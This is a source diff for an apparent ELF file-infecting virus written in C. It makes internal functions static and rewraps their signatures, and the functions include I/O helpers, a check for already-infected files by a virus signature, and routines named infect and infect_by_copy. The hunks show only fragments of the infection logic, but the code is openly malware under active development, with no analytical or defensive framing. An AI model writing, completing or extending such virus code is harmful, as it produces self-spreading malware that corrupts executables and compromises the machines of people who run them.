@@ -164,7 +164,7 @@ static elf_program_header_t victim_ldata_header(off_t victim_size) {
     return header;
 }
 
-struct io_all_result pread_all(int fd, void *buf, size_t count, off_t offset) {
+static struct io_all_result pread_all(int fd, void *buf, size_t count, off_t offset) {
     struct io_all_result result = { .remaining = count, .err = 0};
     char *ptr = buf;
     while (result.remaining > 0) {
@@ -181,7 +181,7 @@ struct io_all_result pread_all(int fd, void *buf, size_t count, off_t offset) {
     return result;
 }
 
-struct io_all_result write_all(int fd, const void *buf, size_t count) {
+static struct io_all_result write_all(int fd, const void *buf, size_t count) {
     struct io_all_result result = { .remaining = count, .err = 0};
     const char *ptr = buf;
     while (result.remaining > 0) {
@@ -196,7 +196,9 @@ struct io_all_result write_all(int fd, const void *buf, size_t count) {
     return result;
 }
 
-struct io_all_result pwrite_all(int fd, const void *buf, size_t count, off_t offset) {
+static struct io_all_result pwrite_all(int fd,
+                                       const void *buf, size_t count,
+                                       off_t offset) {
     struct io_all_result result = { .remaining = count, .err = 0};
     const char *ptr = buf;
     while (result.remaining > 0) {
@@ -211,7 +213,9 @@ struct io_all_result pwrite_all(int fd, const void *buf, size_t count, off_t off
     return result;
 }
 
-struct io_all_result pwritev_all(int fd, struct iovec *iov, int iovcnt, off_t offset) {
+static struct io_all_result pwritev_all(int fd,
+                                        struct iovec *iov, int iovcnt,
+                                        off_t offset) {
     struct io_all_result result = { .remaining = iovcnt, .err = 0};
     while (result.remaining > 0) {
         ssize_t n = pwritev(fd, iov, result.remaining, offset);
@@ -237,7 +241,9 @@ struct io_all_result pwritev_all(int fd, struct iovec *iov, int iovcnt, off_t of
     return result;
 }
 
-struct io_all_result sendfile_all(int out_fd, int in_fd, off_t in_offset, size_t count) {
+static struct io_all_result sendfile_all(int out_fd,
+                                         int in_fd, off_t in_offset,
+                                         size_t count) {
     struct io_all_result result = { .remaining = count, .err = 0};
     off_t *offset = in_offset >= 0 ? &in_offset : NULL;
     while (result.remaining > 0) {
@@ -252,7 +258,7 @@ struct io_all_result sendfile_all(int out_fd, int in_fd, off_t in_offset, size_t
     return result;
 }
 
-int is_possibly_infected(int fd) {
+static int is_possibly_infected(int fd) {
     char magic[EI_NIDENT];
 
     struct io_all_result result = pread_all(fd, magic, sizeof(magic), 0);
@@ -276,7 +282,7 @@ int is_possibly_infected(int fd) {
     return memcmp(virus_id, buffer, sizeof(virus_id)) == 0;
 }
 
-int infect_by_copy(const char *path) {
+static int infect_by_copy(const char *path) {
     const struct virus_info *info = virus_info();
     int result = 0;
 
@@ -434,7 +440,7 @@ exit:
     return result;
 }
 
-int infect(const char *path) {
+static int infect(const char *path) {
     const struct virus_info *info = virus_info();
     int result = 0;
 
